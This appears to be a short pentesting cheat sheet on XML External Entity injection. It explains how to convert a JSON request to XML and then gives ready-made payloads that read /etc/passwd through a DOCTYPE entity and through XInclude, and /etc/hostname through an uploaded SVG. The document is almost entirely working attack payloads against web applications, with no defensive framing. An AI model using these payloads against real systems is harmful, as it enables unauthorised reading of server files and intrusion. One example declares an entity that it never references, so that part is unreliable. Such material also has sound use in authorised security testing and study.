# XMLI METHOD

Check the Contenttype that is allowed.
	If application/json change to application/xml //or other option

Change Post data from json to xml (Conten-Type Converter Burp Extension)

## Simple Example
```
{
  "firstname":"Mike",
  "lastname":"hill",
  "Uid":"123"
 }
```
TO
```
<!--?xml version="1.0"?-->
<userinfo>
  <firstname>
  Mike
  </firstname>
  <lastname>
  hill
  </lastname>
  <Uid>
  123
  </Uid>
</userinfo>
```

If it works, try different approaches/payloads
e.g.
```
<!--?xml version="1.0"?-->
<!DOCTYPE replace [<!ENTITY asd SYSTEM "file:///etc/passwd"> ]>
<userinfo>
  <firstname>
  Mike
  </firstname>
  <lastname>
  hill
  </lastname>
  <Uid>
  123
  </Uid>
</userinfo>
```
Read the etc/passwd file if there is no waf

## XInclude
Client submitted data, e.g. in POST parameter with server-side embed
```
<asd xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></asd>
```

## XXE via SVG upload

Upload a SVG in Image File with XML
```
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```
